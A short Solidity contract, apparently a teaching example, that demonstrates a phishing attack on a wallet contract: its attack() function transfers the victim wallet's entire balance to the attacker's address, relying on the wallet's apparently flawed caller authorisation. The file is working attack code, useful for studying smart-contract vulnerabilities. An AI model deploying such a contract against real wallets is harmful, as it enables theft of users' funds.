// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import  "./Phishing.sol";

contract PhishingAttack {
  address  public owner;
  Wallet wallet;

  constructor(Wallet _wallet) {
    wallet =Wallet( _wallet);
    owner = msg.sender;
}

function attack () public {
    wallet.transfer(owner, wallet.checkBalance());
  }

function balance() public view returns (uint) {
    return address(this).balance;
  }
}